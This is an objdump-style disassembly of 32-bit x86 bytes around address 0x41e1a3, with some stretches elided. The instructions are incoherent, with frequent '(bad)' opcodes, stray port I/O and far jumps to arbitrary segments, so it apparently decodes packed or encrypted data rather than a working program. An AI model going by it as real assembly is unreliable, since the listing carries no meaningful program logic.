  41e1a3:	sbb    DWORD PTR [ebp+eax*4+0x7062787c],0xffffff92
  41e1ab:	stc    
  41e1ac:	in     eax,0x96
  41e1ae:	js     0x41e1d8
  41e1b0:	pop    ebx
  41e1b1:	fcom   st(1)
  41e1b3:	jle    0x7ca484b7
  41e1b9:	mov    ebx,0x60b4cab6
  41e1be:	loope  0x41e19f
  41e1c0:	mov    esp,0x5c116122
  41e1c5:	in     eax,dx
  41e1c6:	ret    0xb6ee
  41e1c9:	xchg   ebp,edx
  41e1cb:	add    eax,0x5661d45e
  41e1d0:	pop    esp
  41e1d1:	jge    0x41e17c
  41e1d3:	scas   eax,DWORD PTR es:[edi]
  41e1d4:	stos   DWORD PTR es:[edi],eax
  41e1d5:	jno    0x41e1f4
  41e1d7:	popa   
  41e1d8:	sub    DWORD PTR [eax],ebp
  41e1da:	outs   dx,DWORD PTR ds:[esi]
  41e1db:	xor    BYTE PTR [edx-0x68f33c48],dh
  41e1e1:	cmc    
  41e1e2:	test   bl,bh
  41e1e4:	xchg   ebp,eax
  41e1e5:	out    dx,eax
  41e1e6:	jmp    0x1382:0x4014a4f5
  41e1ed:	fcom   DWORD PTR [edx-0x6b]
  41e1f0:	push   es
  41e1f1:	fwait
  41e1f2:	or     ebx,esi
  41e1f4:	push   0x82cec6dc
  41e1f9:	jmp    0x41e271
  41e1fb:	out    0x94,al
  41e1fd:	pop    ss
  41e1fe:	add    BYTE PTR [esi+0x304e8706],bh
  41e204:	mov    ch,0x35
  41e206:	out    0x41,al
  41e208:	dec    ecx
  41e209:	in     eax,0x31
  41e20b:	xchg   edi,eax
  41e20c:	sub    BYTE PTR [ebx-0x539b9137],bl
  41e212:	xor    bh,BYTE PTR [ecx+eiz*2]
  41e215:	mov    ah,0x93
  41e217:	xchg   ecx,eax
  41e218:	call   0xe13b:0x9a1f0ff4
  41e21f:	and    DWORD PTR [edi],ebp
  41e221:	push   ebp
  41e222:	adc    edi,DWORD PTR [edx+0x13]
  41e225:	sar    DWORD PTR [ebx+0x4f],cl
  41e228:	sahf   
  41e229:	and    ebp,DWORD PTR [eax]
  41e22b:	add    BYTE PTR [edx],0xb0
  41e22e:	jg     0x41e1e9
  41e230:	cmp    DWORD PTR [edx],ebp
  41e232:	lahf   
  41e233:	xlat   BYTE PTR ds:[ebx]
  41e234:	or     DWORD PTR [esi+0x6a],eax
  41e237:	lock or BYTE PTR [ebx+0x393d9364],0x2a
  41e23f:	mov    ah,0xa5
	...
  41e2b1:	add    BYTE PTR [eax],al
  41e2b3:	add    dh,bh
  41e2b5:	cmp    cl,0x54
  41e2b8:	(bad)  
  41e2b9:	jge    0x41e2ba
  41e2bb:	stos   BYTE PTR es:[edi],al
  41e2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2bd:	push   esi
  41e2be:	arpl   WORD PTR [ebx-0xb],di
  41e2c1:	sbb    DWORD PTR [eax],edi
  41e2c3:	sub    DWORD PTR [ebx+0x44],ecx
  41e2c6:	add    DWORD PTR [eax],eax
  41e2c8:	cmc    
  41e2c9:	add    BYTE PTR [eax],al
  41e2cb:	add    BYTE PTR [ebx],bl
  41e2cd:	arpl   bx,bp
  41e2cf:	ss aas 
  41e2d1:	xor    ecx,ecx
  41e2d3:	mov    edi,0x3ebf7304
  41e2d8:	ss inc edi
  41e2da:	ror    dh,cl
  41e2dc:	dec    ecx
  41e2dd:	mov    ah,0x19
  41e2df:	xlat   BYTE PTR ds:[ebx]
  41e2e0:	(bad)  
  41e2e1:	icebp  
  41e2e2:	sub    eax,0x532c5e42
  41e2e7:	jb     0x41e311
  41e2e9:	stc    
  41e2ea:	(bad)  
  41e2eb:	lock or DWORD PTR [eax],0x1e
  41e2ef:	ins    BYTE PTR es:[edi],dx
  41e2f0:	icebp  
  41e2f1:	ss loop 0x41e2e3
  41e2f4:	adc    DWORD PTR [ebx+0x37],esi
  41e2f7:	or     DWORD PTR [ebx],0xffffffd7
  41e2fa:	fcmovne st,st(4)
  41e2fc:	aad    0xeb
  41e2fe:	push   edx
  41e2ff:	mov    eax,eax
  41e301:	jecxz  0x41e372
  41e303:	sub    esi,DWORD PTR [edx-0x2eb1c518]
  41e309:	sbb    al,0x0
  41e30b:	popa   
  41e30c:	adc    DWORD PTR [edx+0x7e],0xfb0fd679
  41e313:	adc    ecx,DWORD PTR [ebp*2-0x4e93fe4d]
  41e31a:	test   DWORD PTR [ecx],0xd605ae98
  41e320:	ret    0xb9d5
  41e323:	(bad)  
  41e324:	cmp    al,0x56
  41e326:	loope  0x41e330
  41e328:	test   BYTE PTR [edi-0x2d],cl
  41e32b:	xor    eax,0xbbb1307
  41e330:	mov    esp,0x2f79425e
  41e335:	mov    gs,WORD PTR [eax+0x73ba927f]
  41e33b:	mov    ds:0x70990f33,eax
  41e340:	cs dec esi
  41e342:	push   0xffffff93
  41e344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e345:	enter  0x184,0x4
  41e349:	cmp    dl,dl
  41e34b:	jno    0x41e2e7
  41e34d:	mov    dl,dh
  41e34f:	je     0x41e3c6
  41e351:	xchg   edx,eax
  41e352:	cli    
  41e353:	stos   BYTE PTR es:[edi],al
  41e354:	sub    eax,edi
  41e356:	test   DWORD PTR cs:[ebp-0x5c40ed4d],edi
  41e35d:	pop    esp
  41e35e:	mov    ecx,0xc34deb03
  41e363:	jl     0x41e33f
  41e365:	adc    dh,BYTE PTR [edx+0x2ad5df2f]
  41e36b:	test   cl,bl
  41e36d:	loop   0x41e36c
  41e36f:	dec    edi
  41e370:	xor    al,0xf1
  41e372:	xor    al,0xa4
  41e374:	mov    ds:0x5764e296,eax
  41e379:	dec    ebp
  41e37a:	rcr    DWORD PTR [esi+0x42],1
  41e37d:	lock jbe 0x41e395
  41e380:	push   cs
  41e381:	out    0x49,eax
  41e383:	inc    ebx
  41e384:	push   0x3c
  41e386:	jb     0x41e3e0
  41e388:	xchg   ecx,eax
  41e389:	pop    ebx
  41e38a:	xchg   esp,eax
  41e38b:	jp     0x41e36e
  41e38d:	mov    ebp,0x9c2d3545
  41e392:	lock xchg esi,eax
  41e394:	std    
  41e395:	xor    eax,0x689e0123
  41e39a:	mov    edi,0xacbe4ff4
  41e39f:	scas   al,BYTE PTR es:[edi]
  41e3a0:	xchg   edx,eax
  41e3a1:	aad    0x20
  41e3a3:	jns    0x41e39b
  41e3a5:	out    dx,eax
  41e3a6:	xchg   ebx,eax
  41e3a7:	push   esp
  41e3a8:	or     BYTE PTR [edx+edi*1],ch
  41e3ab:	test   eax,0xc7e1803e
  41e3b0:	daa    
  41e3b1:	test   eax,0xb428ef82
  41e3b6:	aas    
  41e3b7:	push   edx
  41e3b8:	ret    
  41e3b9:	aam    0xe7
  41e3bb:	adc    edi,DWORD PTR [ebp+0x6849ab3]
	...
  41e431:	add    BYTE PTR [eax],al
  41e433:	add    dh,dh
  41e435:	rcl    BYTE PTR ss:[edx+edx*8+0x1576f6f4],cl
  41e43d:	mov    ds:0xe7fffead,al
  41e442:	sbb    bh,BYTE PTR [eax+0x40]
  41e445:	inc    ebp
  41e446:	add    DWORD PTR [eax],eax
  41e448:	cmc    
  41e449:	add    BYTE PTR [eax],al
  41e44b:	add    BYTE PTR [eax+0x42],cl
  41e44e:	dec    esi
  41e44f:	ror    dl,cl
  41e451:	aas    
  41e452:	dec    esi
  41e453:	add    DWORD PTR [edx+edx*1-0x206b16ec],eax
  41e45a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e45b:	out    0xe5,al
  41e45d:	idiv   BYTE PTR [ebp+0x30]
  41e460:	mov    WORD PTR [ebx+0x5d],ss
  41e463:	or     BYTE PTR [esi-0x1efae439],0x6c
  41e46a:	add    al,0xb8
  41e46c:	lods   al,BYTE PTR ds:[esi]
  41e46d:	sahf   
  41e46e:	dec    edi
  41e46f:	pop    eax
  41e470:	dec    ebp
  41e471:	fild   DWORD PTR [ebx-0x2d]
  41e474:	ret    
  41e475:	mov    ebp,0xaf3c81a9
  41e47a:	(bad)  
  41e47b:	adc    eax,0x2e8a8879
  41e480:	ret    
  41e481:	inc    edi
  41e482:	mov    dh,0xc5
  41e484:	ret    0x4ae2
  41e487:	adc    al,BYTE PTR [edi-0x498ff63f]
  41e48d:	pop    ecx
  41e48e:	es hlt 
  41e490:	jecxz  0x41e4d1
  41e492:	mov    cl,0x85
  41e494:	retf   0x3cd2
  41e497:	clc    
  41e498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e499:	scas   al,BYTE PTR es:[edi]
  41e49a:	repnz div BYTE PTR [edi]
  41e49d:	pop    ebx
  41e49e:	sar    BYTE PTR [ebx],1
  41e4a0:	inc    ebx
  41e4a1:	dec    ebp
  41e4a2:	mov    ds:0xa39e7fb3,eax
  41e4a7:	add    cl,BYTE PTR [edi]
  41e4a9:	or     DWORD PTR [ebp+0x64],edi
  41e4ac:	mov    al,0xa4
  41e4ae:	(bad)  
  41e4af:	mov    ch,bh
  41e4b1:	jge    0x41e52a
  41e4b3:	mov    cl,0x51
  41e4b5:	shl    BYTE PTR [esp+eax*2-0x61],1
  41e4b9:	or     al,0xbf
  41e4bb:	xchg   esi,eax
  41e4bc:	es mov ebp,0xbaead2a3
  41e4c2:	pop    ds
  41e4c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4c4:	test   eax,0x88311486
  41e4c9:	out    0xc2,al
  41e4cb:	int    0xb6
  41e4cd:	rol    DWORD PTR [ebp+0x36575ae4],cl
  41e4d3:	mov    al,ds:0xad12a1c
  41e4d8:	test   al,0xa0
  41e4da:	xor    ebx,DWORD PTR [eax-0x55]
  41e4dd:	lds    ecx,FWORD PTR [eax+0x5]
  41e4e0:	jae    0x41e539
  41e4e2:	mov    esi,0xef679819
  41e4e7:	mov    ss,WORD PTR [ebx-0x18e693fe]
  41e4ed:	daa    
  41e4ee:	bound  edi,QWORD PTR [esi-0x7f]
  41e4f1:	test   eax,0x5662384d
  41e4f6:	xor    DWORD PTR [ecx],esi
  41e4f8:	push   edi
  41e4f9:	xchg   ah,ah
  41e4fb:	pop    ds
  41e4fc:	xor    BYTE PTR [ecx-0x4faf2920],bh
  41e502:	and    ah,BYTE PTR [ebp+0x4f]
  41e505:	cli    
  41e506:	inc    ebx
  41e507:	sahf   
  41e508:	out    0x62,eax
  41e50a:	or     ebx,DWORD PTR [edx-0x36]
  41e50d:	ds pop eax
  41e50f:	xor    al,0x2f
  41e511:	fs add al,BYTE PTR ss:[ebx*2+0x5874dabc]
  41e51a:	or     DWORD PTR [eax+0x75b61e7b],edi
  41e520:	mov    al,0x9b
  41e522:	int    0x20
  41e524:	cmp    bh,ah
  41e526:	mov    dl,0x99
  41e528:	stos   DWORD PTR es:[edi],eax
  41e529:	addr16 jmp 0x41e561
  41e52c:	outs   dx,BYTE PTR ds:[esi]
  41e52d:	push   esp
  41e52e:	push   edx
  41e52f:	cs cmp eax,0x5c6eb54b
  41e535:	stos   DWORD PTR es:[edi],eax
  41e536:	sub    ebp,DWORD PTR [ebp-0x36e0648a]
  41e53c:	push   esp
  41e53d:	outs   dx,DWORD PTR ds:[esi]
  41e53e:	or     eax,esp
  41e540:	mov    cl,0x0
	...
  41e5b2:	add    BYTE PTR [eax],al
  41e5b4:	jl     0x41e54f
  41e5b6:	dec    esp
  41e5b7:	jbe    0x41e5a6
  41e5b9:	idiv   DWORD PTR [esi-0x65]
  41e5bc:	ss adc al,0xc3
  41e5bf:	repz loopne 0x41e573
  41e5c2:	enter  0x3552,0x46
  41e5c6:	add    DWORD PTR [eax],eax
  41e5c8:	cmc    
  41e5c9:	add    BYTE PTR [eax],al
  41e5cb:	add    BYTE PTR [edx-0x61af1add],bh
  41e5d1:	sub    BYTE PTR [ebp-0x43],cl
  41e5d4:	icebp  
  41e5d5:	shl    BYTE PTR [ebx],1
  41e5d7:	xchg   edi,eax
  41e5d8:	daa    
  41e5d9:	push   eax
  41e5da:	xchg   edx,eax
  41e5dc:	sbb    edx,eax
  41e5de:	popf   
  41e5df:	cmp    al,0x4b
  41e5e1:	add    BYTE PTR [edx+0x575f45cb],0x81
  41e5e8:	sar    DWORD PTR [esp+ebp*2-0x33],0x29
  41e5ed:	mov    al,0x15
  41e5ef:	xchg   BYTE PTR [edi+0x58],dl
  41e5f2:	pop    ebx
  41e5f3:	cmp    DWORD PTR [edi*4-0x630b6efc],ebp
  41e5fa:	fs adc al,0x87
  41e5fd:	jo     0x41e59b
  41e5ff:	inc    ebp
  41e600:	loope  0x41e646
  41e602:	iret   
  41e603:	ja     0x41e615
  41e605:	pusha  
  41e606:	dec    edx
  41e607:	pop    ebp
  41e608:	jmp    0xa5810260
  41e60d:	(bad)  
  41e60e:	jecxz  0x41e66e
  41e610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e611:	mov    ebp,0xf00fca66
  41e616:	or     esp,DWORD PTR [ecx+0x2c]
  41e619:	stos   BYTE PTR es:[edi],al
  41e61a:	adc    edi,edi
  41e61c:	shl    BYTE PTR [esi+0x6db5847e],0xcb
  41e623:	mov    ah,0x8a
  41e625:	and    ch,BYTE PTR [esi]
  41e627:	fs aaa 
  41e629:	ret    
  41e62a:	call   esp
  41e62c:	mov    BYTE PTR cs:[ebp+0x79a29a02],bl
  41e633:	and    BYTE PTR [ebx-0x4],al
  41e636:	jge    0x41e5db
  41e638:	stos   BYTE PTR es:[edi],al
  41e639:	adc    DWORD PTR [edx],0x7f
  41e63c:	(bad)  
  41e63d:	stc    
  41e63e:	push   0x34550a70
  41e643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e644:	adc    ch,BYTE PTR [ecx]
  41e646:	pop    ds
  41e647:	mov    gs,WORD PTR [edi]
  41e649:	setae  BYTE PTR [edx-0x3d]
  41e64d:	cli    
  41e64e:	mov    dh,0x53
  41e650:	enter  0xe913,0x2a
  41e654:	and    eax,0xceab4656
  41e659:	ror    DWORD PTR [esi+0x30],1
  41e65c:	push   ecx
  41e65d:	adc    eax,0x1463a959
  41e662:	dec    edi
  41e663:	in     eax,0x3
  41e665:	repz dec ebp
  41e667:	fisttp WORD PTR [esi+0x354f04d5]
  41e66d:	ins    BYTE PTR es:[edi],dx
  41e66e:	jle    0x41e6af
  41e670:	or     BYTE PTR [eax-0x2cea91a0],dh
  41e676:	pop    ds
  41e677:	test   BYTE PTR [esi+0x4df58e89],ch
  41e67d:	in     al,dx
  41e67e:	jmp    0x41e618
  41e680:	pushf  
  41e681:	push   esp
  41e682:	add    esi,DWORD PTR ss:[ebx]
  41e685:	cmc    
  41e686:	(bad)  
  41e687:	dec    BYTE PTR [ebx-0x37ec95df]
  41e68d:	pop    esi
  41e68e:	xor    al,0x75
  41e690:	mov    dl,BYTE PTR [edi]
  41e692:	pop    es
  41e693:	push   es
  41e694:	mov    al,0x3e
  41e696:	xchg   esp,eax
  41e697:	loope  0x41e69e
  41e699:	dec    edx
  41e69a:	(bad)  
  41e69b:	jmp    0x41e626
  41e69d:	nop
  41e69e:	call   0x47ca2ee2
  41e6a3:	jg     0x41e702
  41e6a5:	jnp    0x41e6df
  41e6a7:	retf   
  41e6a8:	stc    
  41e6a9:	mov    ds:0x852d7985,eax
  41e6ae:	repnz (bad) 
  41e6b0:	fisubr WORD PTR [bp+0x11]
  41e6b4:	jge    0x41e706
  41e6b6:	stc    
  41e6b7:	mov    edi,0x9f274d4f
  41e6bc:	push   esi
  41e6bd:	and    BYTE PTR [esi],dl
  41e6bf:	je     0x41e6b6
	...
  41e731:	add    BYTE PTR [eax],al
  41e733:	add    BYTE PTR [esi+ecx*8],ah
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	sub    ch,dh
  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	fs into 
  41e73c:	cmp    al,0xb2
  41e73e:	xor    ebp,DWORD PTR [ebx+0x4fde90f8]
  41e744:	sub    al,BYTE PTR [edi+0x1]
  41e747:	add    ch,dh
  41e749:	add    BYTE PTR [eax],al
  41e74b:	add    BYTE PTR [ecx+0x7ce0b5fb],ch
  41e751:	pop    edi
  41e752:	cmp    DWORD PTR [ebx],ebx
  41e754:	inc    ebp
  41e755:	sub    cl,BYTE PTR [edi]
  41e757:	test   BYTE PTR [ecx-0x1d],0x25
  41e75b:	inc    edi
  41e75c:	stos   BYTE PTR es:[edi],al
  41e75d:	mov    bl,0x6a
  41e75f:	mov    al,0xa0
  41e761:	jns    0x41e6f1
  41e763:	shl    DWORD PTR [edx],0xa8
  41e766:	or     DWORD PTR [ecx+edx*2],0xfe8493db
  41e76d:	mov    al,ds:0xbf2b9000
  41e772:	aad    0x1a
  41e774:	sahf   
  41e775:	push   cs
  41e776:	xchg   DWORD PTR [ecx-0x36fd86ab],ecx
  41e77c:	fadd   QWORD PTR [esi]
  41e77e:	mov    ebx,0xcd289d51
  41e783:	push   esi
  41e784:	xor    DWORD PTR [ebx+0x2c],esi
  41e787:	mov    edx,0x6221bc7c
  41e78c:	xchg   ebx,eax
  41e78d:	jmp    0x41e748
  41e78f:	mov    ecx,0x99716fea
  41e794:	pop    esp
  41e795:	icebp  
  41e796:	mov    ebx,0xea688ad2
  41e79b:	mov    esi,DWORD PTR ss:[eax]
  41e79e:	retf   0xf2f0
  41e7a1:	jecxz  0x41e7da
  41e7a3:	mov    ebp,0xba765a1c
  41e7a8:	fidivr DWORD PTR [ebx]
  41e7aa:	int3   
  41e7ab:	rcl    edi,1
  41e7ad:	cs out dx,eax
  41e7af:	mov    BYTE PTR [edi+0x44ad1672],dl
  41e7b5:	int3   
  41e7b6:	inc    ebx
  41e7b7:	cmp    DWORD PTR [edi-0x62],esi
  41e7ba:	test   DWORD PTR [ecx],esp
  41e7bc:	outs   dx,DWORD PTR ds:[esi]
  41e7bd:	mov    gs,WORD PTR [eax+0x4f]
  41e7c0:	test   eax,0x6d5b0cca
  41e7c5:	pushf  
  41e7c6:	cdq    
  41e7c7:	lods   al,BYTE PTR ds:[esi]
  41e7c8:	test   eax,0x6a9d1d42
  41e7cd:	mov    al,ds:0x2201e212
  41e7d2:	fdivr  QWORD PTR gs:[eax]
  41e7d5:	shr    DWORD PTR [ebx],cl
  41e7d7:	push   ecx
  41e7d8:	stos   DWORD PTR es:[edi],eax
  41e7d9:	sti    
  41e7da:	cmp    edx,DWORD PTR ds:0xeb4d07b8
  41e7e0:	ds add eax,0x7979b342
  41e7e6:	idiv   BYTE PTR [edi]
  41e7e8:	and    ebp,esi
  41e7ea:	or     al,0x5d
  41e7ec:	add    al,ch
  41e7ee:	outs   dx,DWORD PTR ds:[esi]
  41e7ef:	in     eax,0xb1
  41e7f1:	cli    
  41e7f2:	in     eax,0xbd
  41e7f4:	dec    edi
  41e7f5:	sbb    dh,BYTE PTR [esi]
  41e7f7:	jnp    0x41e7dc
  41e7f9:	lahf   
  41e7fa:	sub    DWORD PTR [ebp-0x55],ebp
  41e7fd:	in     al,0xec
  41e7ff:	sbb    ebx,edi
  41e801:	mov    ah,0x28
  41e803:	into   
  41e804:	es or  eax,0x73d5abfb
  41e80a:	(bad)
  41e80d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e80e:	aad    0x6f
  41e810:	loop   0x41e79f
  41e812:	sub    al,0x8d
  41e814:	inc    ebx
  41e815:	xlat   BYTE PTR ds:[ebx]
  41e816:	push   ebp
  41e817:	sub    BYTE PTR [edi-0x79],0x80
  41e81b:	cmp    DWORD PTR [ebx+ebp*8+0x35],edx
  41e81f:	ss nop
  41e821:	fisttp DWORD PTR [edx-0x33e2b3ff]
  41e827:	pop    ecx
  41e828:	outs   dx,DWORD PTR ds:[esi]
  41e829:	push   DWORD PTR [edx+0x7a3cc20c]
  41e82f:	add    DWORD PTR [ebx+0x65],esi
  41e832:	push   ss
  41e833:	nop
  41e834:	outs   dx,DWORD PTR ds:[esi]
  41e835:	jmp    0x28ce:0x15f3837
  41e83c:	ds sub cl,bl
  41e83f:	test   eax,0xa8
	...
  41e8b4:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41e8b8:	scas   eax,DWORD PTR es:[edi]
  41e8b9:	(bad)  
  41e8ba:	fistp  QWORD PTR [esi+eiz*4-0x50]
  41e8be:	loop   0x41e93a
  41e8c0:	imul   esp,DWORD PTR [esi-0x35],0x44
  41e8c4:	pop    ds
  41e8c5:	dec    eax
  41e8c6:	add    DWORD PTR [eax],eax
  41e8c8:	cmc    
  41e8c9:	add    BYTE PTR [eax],al
  41e8cb:	add    BYTE PTR ds:0xe99cb8a6,cl
  41e8d1:	jne    0x41e8fe
  41e8d3:	out    dx,eax
  41e8d4:	mov    eax,0xde263e23
  41e8d9:	jmp    0x39f0:0xdd94cb0e
  41e8e0:	pop    ebx
  41e8e1:	dec    eax
  41e8e2:	data16 je 0x41e90f
  41e8e5:	mov    ds:0xda1a1afa,eax
  41e8ea:	sbb    BYTE PTR [ebx+edx*8],ch
  41e8ed:	xor    bl,dh
  41e8ef:	gs mov esi,0xb75147d
  41e8f5:	into   
  41e8f6:	lds    ebx,FWORD PTR [esi]
  41e8f8:	mov    DWORD PTR [ebx],edx
  41e8fa:	rcl    eax,0xc8
  41e8fd:	and    esp,ecx
  41e8ff:	jo     0x41e8d7
  41e901:	fimul  WORD PTR [edi+0x56]
  41e904:	scas   eax,DWORD PTR es:[edi]
  41e905:	inc    ebp
  41e906:	dec    edx
  41e907:	test   DWORD PTR [ecx-0x56],ecx
  41e90a:	push   cs
  41e90b:	fdiv   DWORD PTR [ebx+0x112b567b]
  41e911:	scas   al,BYTE PTR es:[edi]
  41e912:	lea    ebx,[ebp-0x7f1633f2]
  41e918:	sbb    eax,0xb8c284ef
  41e91d:	in     al,dx
  41e91e:	adc    ebp,DWORD PTR [ecx+0x1ba08adf]
  41e924:	(bad)  
  41e925:	pop    es
  41e926:	inc    ebx
  41e927:	pop    es
  41e928:	nop
  41e929:	mov    bh,0x4f
  41e92b:	mov    edi,eax
  41e92d:	xchg   esi,eax
  41e92e:	test   DWORD PTR [ebx],0xa993160f
  41e934:	cmp    esi,DWORD PTR [ebx+0x75]
  41e937:	and    eax,0xb4b55440
  41e93c:	scas   eax,DWORD PTR es:[edi]
  41e93d:	arpl   bp,si
  41e93f:	xlat   BYTE PTR ds:[ebx]
  41e940:	(bad)  
  41e942:	out    dx,eax
  41e943:	call   0xae3e:0x4344ec40
  41e94a:	bswap  esp
  41e94c:	cwde   
  41e94d:	sti    
  41e94e:	cmp    eax,0x12f08002
  41e953:	in     al,dx
  41e954:	mov    esi,0xd7b3d8d3
  41e959:	fisttp QWORD PTR [eax-0x15897388]
  41e95f:	adc    al,0x80
  41e961:	push   esp
  41e962:	(bad)  
  41e963:	(bad)  
  41e964:	bound  edi,QWORD PTR [edx]
  41e966:	mov    eax,ds:0x4b0753e2
  41e96b:	clc    
  41e96c:	out    dx,al
  41e96d:	std    
  41e96e:	jo     0x41e923
  41e970:	jp     0x41e9b2
  41e972:	adc    eax,0xe0de239b
  41e977:	ds mov ebp,0x6e254dcc
  41e97d:	xchg   edi,eax
  41e97e:	js     0x41e902
  41e980:	lds    eax,FWORD PTR [ecx+0xf]
  41e983:	data16 (bad) 
  41e985:	aad    0x60
  41e987:	cwde   
  41e988:	ret    
  41e989:	mov    ds:0xecec143f,al
  41e98e:	xchg   ebp,eax
  41e98f:	aas    
  41e990:	lods   eax,DWORD PTR ds:[esi]
  41e991:	cmp    edx,DWORD PTR [ebp+0x30e41390]
  41e997:	add    DWORD PTR [edx+0x1e],esp
  41e99a:	lahf   
  41e99b:	pop    ecx
  41e99c:	sub    BYTE PTR [esi],0xab
  41e99f:	neg    ebx
  41e9a1:	pop    ecx
  41e9a2:	aas    
  41e9a3:	lahf   
  41e9a4:	test   al,0xdc
  41e9a6:	(bad)  
  41e9a7:	out    dx,al
  41e9a8:	call   0xbf69e4c5
  41e9ad:	sub    eax,0x5ffe6339
  41e9b2:	xchg   ebx,eax
  41e9b3:	xchg   edx,eax
  41e9b4:	pop    esp
  41e9b5:	imul   ecx,DWORD PTR [edi-0x12],0xffffffa2
  41e9b9:	xchg   esi,eax
  41e9ba:	fcmovnu st,st(6)
  41e9bc:	test   DWORD PTR [edi+0x2c],esp
  41e9bf:	enter  0x74,0x0
	...
  41ea33:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41ea3a:	cmp    al,0x5f
  41ea3c:	les    ecx,FWORD PTR [ebx+0x21]
  41ea3f:	fnstsw WORD PTR [esi-0x17]
  41ea42:	jl     0x41e9ea
  41ea44:	adc    al,0x49
  41ea46:	add    DWORD PTR [eax],eax
  41ea48:	cmc    
  41ea49:	add    BYTE PTR [eax],al
  41ea4b:	add    BYTE PTR [ecx+0x79ef80a4],ch
  41ea51:	int    0xda
  41ea53:	jno    0x41ea1b
  41ea55:	push   eax
  41ea56:	cmp    BYTE PTR [ecx],bh
  41ea58:	pop    eax
  41ea59:	retf   
  41ea5a:	aaa    
  41ea5b:	or     eax,0x808908bc
  41ea60:	or     al,0xa4
  41ea62:	jb     0x41eac9
  41ea64:	sub    BYTE PTR [edx+0x6a6f7f29],ch
  41ea6a:	jns    0x41ea91
  41ea6c:	imul   ebp,DWORD PTR [edx],0xffffff8a
  41ea6f:	push   ss
  41ea70:	leave  
  41ea71:	outs   dx,DWORD PTR ds:[esi]
  41ea72:	retf   0x823a
  41ea75:	popa   
  41ea76:	xor    eax,0x2c36719a
  41ea7b:	sbb    ah,BYTE PTR [ecx-0x69]
  41ea7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea7f:	bound  esi,QWORD PTR [esi+0x5ff60028]
  41ea85:	pmaddwd mm6,QWORD PTR [esi-0x76]
  41ea89:	std    
  41ea8a:	retf   0x40d1
  41ea8d:	mov    edx,0xa8cd23bb
  41ea92:	pop    edi
  41ea93:	xchg   esi,eax
  41ea94:	das    
  41ea95:	sbb    cl,BYTE PTR [edi]
  41ea97:	stos   BYTE PTR es:[edi],al
  41ea98:	aas    
  41ea99:	xchg   edx,eax
  41ea9a:	in     eax,0xdf
  41ea9c:	int    0x2d
  41ea9e:	add    BYTE PTR [ebx+edi*8-0x28],dh
  41eaa2:	cs jle 0x41ea3c
  41eaa5:	clc    
  41eaa6:	jl     0x41eab2
  41eaa8:	das    
  41eaa9:	mov    al,0x6b
  41eaab:	push   0x77
  41eaad:	mov    al,ds:0x18f9b835
  41eab2:	push   edx
  41eab3:	sahf   
  41eab4:	aaa    
  41eab5:	adc    ebp,ebp
  41eab7:	xchg   edi,eax
  41eab8:	outs   dx,DWORD PTR ds:[esi]
  41eab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaba:	jnp    0x41ea6a
  41eabc:	pop    ds
  41eabd:	add    esp,eax
  41eabf:	jmp    0x41ea88
  41eac1:	sbb    DWORD PTR [edi+0x7d1efdd2],ebx
  41eac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eac8:	jnp    0x41ea80
  41eaca:	cld    
  41eacb:	dec    ecx
  41eacc:	dec    eax
  41eacd:	outs   dx,DWORD PTR ds:[esi]
  41eace:	push   0x5c3264eb
  41ead3:	repnz loopne 0x41eab2
  41ead6:	pop    ss
  41ead7:	mov    eax,ds:0xa97f5203
  41eadc:	shl    DWORD PTR [eax],cl
  41eade:	inc    esi
  41eadf:	or     edi,DWORD PTR [eax+eiz*2-0x26]
  41eae3:	and    eax,0x79e77ea6
  41eae8:	clc    
  41eae9:	jne    0x41eaef
  41eaeb:	call   ecx
  41eaed:	mov    eax,ds:0xbeb483e6
  41eaf2:	ss cli 
  41eaf4:	or     al,0x91
  41eaf6:	add    eax,0xf51b4570
  41eafb:	std    
  41eafc:	ret    
  41eafd:	pop    ds
  41eafe:	aas    
  41eaff:	jmp    0x6a272d0f
  41eb04:	hlt    
  41eb05:	int3   
  41eb06:	mov    dl,0xad
  41eb08:	rcl    DWORD PTR ds:0x17238a66,0xf2
  41eb0f:	fnstcw WORD PTR [edi+edx*4+0x78508ad1]
  41eb16:	xchg   ecx,eax
  41eb17:	mov    ch,0x89
  41eb19:	and    ch,ch
  41eb1b:	jae    0x41eb47
  41eb1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb1e:	mov    bh,0xf0
  41eb20:	outs   dx,DWORD PTR ds:[esi]
  41eb21:	xor    eax,0x792b05d
  41eb26:	inc    ebx
  41eb27:	cmp    al,0x66
  41eb29:	cmc    
  41eb2a:	bound  esp,QWORD PTR [ebx]
  41eb2c:	mov    cl,0x4f
  41eb2e:	enter  0xb472,0xbd
  41eb32:	popa   
  41eb33:	cmp    al,0x21
  41eb35:	inc    esp
  41eb36:	fld    DWORD PTR [edi-0x4b1ccf19]
  41eb3c:	aaa    
  41eb3d:	call   0x0:0x5c9bbd
	...
  41ebb4:	outs   dx,DWORD PTR ds:[esi]
  41ebb5:	retf   0x9815
  41ebb8:	mov    ch,0xdf
  41ebba:	out    dx,eax
  41ebbb:	inc    DWORD PTR [ebx+0x1e]
  41ebbe:	arpl   sp,si
  41ebc0:	xchg   edi,eax
  41ebc1:	adc    al,BYTE PTR [eax+ecx*2]
  41ebc4:	or     DWORD PTR [edx+0x1],ecx
  41ebc7:	add    ch,dh
  41ebc9:	add    BYTE PTR [eax],al
  41ebcb:	add    BYTE PTR [edx+0x0],bl
  41ebce:	jl     0x41eb54
  41ebd0:	lock sbb ebx,DWORD PTR [ebp-0x668039bc]
  41ebd7:	sub    ebp,DWORD PTR [eax+0x4ef128d2]
  41ebdd:	stos   BYTE PTR es:[edi],al
  41ebde:	inc    ebx
  41ebdf:	sub    ebp,DWORD PTR [edx-0x4630cc6f]
  41ebe5:	pop    edx
  41ebe6:	adc    edi,edi
